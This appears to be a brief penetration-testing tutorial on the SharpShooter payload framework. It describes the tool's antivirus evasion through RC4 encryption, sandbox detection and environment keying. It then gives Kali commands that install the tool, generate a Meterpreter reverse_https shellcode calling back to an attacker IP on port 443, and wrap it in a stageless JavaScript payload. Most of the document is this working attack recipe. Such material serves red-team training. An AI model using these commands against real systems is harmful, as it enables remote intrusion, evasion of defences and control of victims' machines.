SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. It leverages James Forshaw's [DotNetToJavaScript](https://github.com/tyranid/DotNetToJScript) tool to invoke methods from the SharpShooter DotNet serialised object. Payloads can be retrieved using Web or DNS delivery or both; SharpShooter is compatible with the MDSec ActiveBreach PowerDNS project. Alternatively, stageless payloads with embedded shellcode execution can also be generated for the same scripting formats.

SharpShooter payloads are RC4 encrypted with a random key to provide some modest anti-virus evasion, and the project includes the capability to integrate sandbox detection and environment keying to assist in evading detection.

Install:

```
kali@kali:/opt$ sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git

kali@kali:/opt$ cd SharpShooter/
kali@kali:/opt/SharpShooter$ sudo pip install -r requirements.txt
```

First Generate shellcode with msf:

```
kali@kali:/opt/SharpShooter$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
```

Generate a js payload:
```
kali@kali:/opt/SharpShooter$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
```
